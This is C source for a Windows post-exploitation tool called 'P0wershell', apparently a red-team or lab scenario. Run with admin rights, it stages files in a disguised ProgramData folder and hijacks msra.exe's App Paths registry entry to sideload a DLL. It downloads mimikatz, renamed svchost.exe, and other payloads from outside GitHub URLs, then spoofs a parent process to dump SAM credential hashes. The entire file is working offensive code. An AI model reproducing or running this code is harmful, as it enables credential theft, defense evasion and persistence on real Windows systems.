#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <shlobj.h>
#include "payload_extract.h"

#pragma comment(lib, "urlmon.lib")

BOOL WINAPI IsUserAnAdmin(void);

/* ponytail: shared with the svchost.exe (mimikatz) staging path */
static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";
static const char *g_mimi_url = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/payload.zip";
static const char *g_mimi_pw = "12@1";

static void audit(const char *fmt, ...) {
    FILE *f = fopen(g_audit, "a");
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}

static void log_msg(const char* msg) {
    FILE* f = fopen("C:\\p0wershell.log", "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

static void press_exit(int code, const char* why) {
    char buf[256];
    snprintf(buf, sizeof(buf), "P0wershell exiting (%d)\n%s", code, why ? why : "");
    log_msg(buf);
    MessageBoxA(NULL, buf, "P0wershell", MB_OK | MB_ICONINFORMATION);
    exit(code);
}

static DWORD find_pid_by_name(const char *name) {
    DWORD found = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = { .dwSize = sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (lstrcmpiA(pe.szExeFile, name) == 0) { found = pe.th32ProcessID; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

/* ponytail: stage svchost.exe (mimikatz) into g_dir by downloading the
   encrypted payload.zip from our own repo and extracting in-process. Runs in
   P0wershell (elevated, long-lived) instead of msra.exe's worker thread. */
static void stage_payload(void) {
    char zipPath[MAX_PATH], outExe[MAX_PATH];
    wsprintfA(zipPath, "%s\\svchost.zip", g_dir);
    wsprintfA(outExe, "%s\\svchost.exe", g_dir);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(outExe, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] Already present: %s", outExe); return; }

    audit("[+] Downloading payload.zip -> %s", outExe);
    HRESULT hr = URLDownloadToFileA(NULL, g_mimi_url, zipPath, 0, NULL);
    if (hr != S_OK) { audit("[-] payload.zip download failed (0x%lx)", hr); return; }
    audit("[+] Zip downloaded: %s", zipPath);

    if (!extract_payload(zipPath, outExe, g_mimi_pw))
        audit("[-] Payload staging failed: %s", outExe);
    else
        audit("[+] Payload staged: %s", outExe);

    DeleteFileA(zipPath);
    audit("[*] Temp zip removed: %s", zipPath);
}

static void launch_mimikatz(void) {
    char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
    wsprintfA(svchost, "%s\\svchost.exe", g_dir);
    wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
    // ponytail: lsadump::sam needs SeBackupPrivilege to open HKLM\SAM; mimikatz
    // only auto-enables SeDebugPrivilege. Enable both before the dump, and use
    // the built-in `log` command (stdout redirection is unreliable here).
    DeleteFileA(dump);
    wsprintfA(cmd, "\"%s\" \"log %s\" \"privilege::debug\" \"privilege::backup\" \"lsadump::sam\" \"exit\"", svchost, dump);

    DWORD pid = find_pid_by_name("explorer.exe");
    if (!pid) pid = find_pid_by_name("winlogon.exe");
    if (!pid) { audit("[-] No stable parent process found for PPID spoofing"); return; }

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid);
    if (!hParent) { audit("[-] OpenProcess failed (%lu)", GetLastError()); return; }
    audit("[+] Using %s (PID: %lu) as spoofed parent", (pid ? "explorer/winlogon" : "?"), pid);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    PPROC_THREAD_ATTRIBUTE_LIST attrList = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!attrList) { CloseHandle(hParent); return; }

    if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
        audit("[-] InitializeProcThreadAttributeList failed (%lu)", GetLastError());
        HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
    }
    if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
        audit("[-] UpdateProcThreadAttribute failed (%lu)", GetLastError());
        DeleteProcThreadAttributeList(attrList); HeapFree(GetProcessHeap(), 0, attrList); CloseHandle(hParent); return;
    }
    audit("[+] PPID attribute set");

    STARTUPINFOEXA si = { .StartupInfo = { .cb = sizeof(si) } };
    si.lpAttributeList = attrList;
    PROCESS_INFORMATION pi;
    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si.StartupInfo, &pi)) {
        audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
        CloseHandle(pi.hThread);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        audit("[+] SAM dump completed -> %s", dump);
    } else {
        audit("[-] CreateProcess svchost.exe failed (%lu)", GetLastError());
    }
    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);
}

int main(void) {
    { FILE* m = fopen("C:\\p0wershell.started", "w"); if (m) { fputs("1", m); fclose(m); } }
    DeleteFileA("C:\\p0wershell.log");
    log_msg("[+] P0wershell started");
    g_audit_fn = audit;

    if (!IsUserAnAdmin()) {
        printf("[-] Not running as admin.\n");
        press_exit(1, "[-] Not running as admin.");
    }

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    printf("[+] Path: %s\n", path);
    if (lstrcmpiA(path, "C:\\Windows\\System32\\P0wershell.exe") != 0)
        printf("[*] Warning: not running from System32, post-exploitation will proceed anyway\n");

    printf("[+] Running in Elevated Session.\n");

    DWORD parentPID = 0;
    DWORD myPID = GetCurrentProcessId();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == myPID) {
                    parentPID = pe.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    const char* parentName = "unknown";
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == parentPID) {
                    parentName = pe.szExeFile;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    printf("[+] Parent PID: %lu (%s)\n", parentPID, parentName);

    const char *targetDir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
    char targetMsra[MAX_PATH];
    char targetUserenv[MAX_PATH];
    char targetMimilib[MAX_PATH];
    wsprintfA(targetMsra, "%s\\msra.exe", targetDir);
    wsprintfA(targetUserenv, "%s\\userenv.dll", targetDir);
    wsprintfA(targetMimilib, "%s\\mimilib.dll", targetDir);

    {  /* ponytail: SHCreateDirectoryExA creates intermediates recursively */
        int hr = SHCreateDirectoryExA(NULL, targetDir, NULL);
        if (hr != ERROR_SUCCESS && hr != ERROR_ALREADY_EXISTS) {
            printf("[-] Failed to create directory (0x%lx)\n", hr);
            press_exit(1, "[-] Failed to create target directory.");
        }
    }
    printf("[+] Directory created: %s\n", targetDir);
    log_msg("[+] Target directory ready");

    if (!CopyFileA("C:\\Windows\\System32\\msra.exe", targetMsra, FALSE)) {
        printf("[-] Failed to copy msra.exe (%lu)\n", GetLastError());
        press_exit(1, "[-] Failed to copy msra.exe.");
    }
    printf("[+] msra.exe copied\n");
    log_msg("[+] msra.exe copied");

    HKEY hKey;
    LONG regRet = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msra.exe",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (regRet != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key (%ld)\n", regRet);
        press_exit(1, "[-] Failed to set registry key.");
    }
    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)targetMsra, lstrlenA(targetMsra) + 1);
    RegCloseKey(hKey);
    printf("[+] Registry key set\n");
    log_msg("[+] Registry key set");

    const char *dllBaseUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main";
    char dllUrl[MAX_PATH];
    wsprintfA(dllUrl, "%s/userenv.dll", dllBaseUrl);
    printf("[+] Downloading userenv.dll...\n");
    HRESULT hr = URLDownloadToFileA(NULL, dllUrl, targetUserenv, 0, NULL);
    if (hr != S_OK)
        printf("[-] userenv.dll download failed (0x%lx) — place it manually\n", hr);
    else
        printf("[+] userenv.dll downloaded\n");

    stage_payload();
    launch_mimikatz();

    printf("[+] Downloading mimilib.dll...\n");
    hr = URLDownloadToFileA(NULL,
        "https://raw.githubusercontent.com/ParrotSec/mimikatz/master/x64/mimilib.dll",
        targetMimilib, 0, NULL);
    if (hr != S_OK)
        printf("[-] mimilib.dll download failed (0x%lx) — place it manually\n", hr);
    else
        printf("[+] mimilib.dll downloaded\n");

    // ponytail: 740 = ERROR_ELEVATION_REQUIRED; msra.exe has a requireAdministrator
    // manifest, so plain CreateProcess fails. ShellExecuteEx "runas" satisfies it
    // (no prompt when caller is already elevated).
    SHELLEXECUTEINFOA sei = { .cbSize = sizeof(sei) };
    sei.lpFile = targetMsra;
    sei.nShow = SW_SHOW;
    sei.lpVerb = "runas";
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    if (ShellExecuteExA(&sei) && sei.hProcess) {
        printf("[+] msra.exe launched (PID: %lu)\n", GetProcessId(sei.hProcess));
        CloseHandle(sei.hProcess);
    } else {
        printf("[-] Failed to launch msra.exe (0x%lx)\n", (DWORD)(DWORD_PTR)sei.hInstApp);
    }

    printf("Press 'q' to exit\n");
    Sleep(200);
    while (_getch() != 'q') {}
    press_exit(0, "[+] P0wershell completed.");
}
